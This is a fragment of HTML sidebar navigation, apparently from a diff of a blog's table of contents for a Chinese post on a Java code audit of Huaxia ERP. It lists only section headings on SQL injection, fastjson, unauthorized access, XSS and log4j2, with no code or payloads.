href="#%E7%9C%8Bfilter"><span class="nav-text">看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text">半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text">成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredUrls"><span class="nav-text">ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowUrls"><span class="nav-text">allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text">log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8Ferp"><span class="nav-text"> JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text"> 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text"> 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text"> 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text"> 审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text"> 看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text"> 看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bfilter"><span class="nav-text"> 看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text"> 审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text"> sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text"> fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text"> 半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text"> 成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text"> 未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredurls"><span class="nav-text"> ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowurls"><span class="nav-text"> allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss"><span class="nav-text"> XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text"> log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text"> 参考资料</span></a></li></ol></li></ol>
     </div>
 </div>
 
